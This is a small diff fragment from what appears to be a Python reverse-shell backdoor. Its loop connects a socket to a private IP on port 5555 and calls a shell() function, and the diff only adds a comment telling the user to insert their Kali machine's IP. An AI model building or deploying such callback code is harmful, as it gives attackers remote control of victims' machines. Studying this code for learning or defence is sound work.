@@ -21,7 +21,7 @@ def connection ():
        while True:
                time.sleep(20)  
                try:
-                       s.connect(('192.168.1.236' ,5555))
+                       s.connect(('192.168.1.236' ,5555)) #Make sure you put in your IP address of Kali machine
                        shell()
                        s.close()
                        break
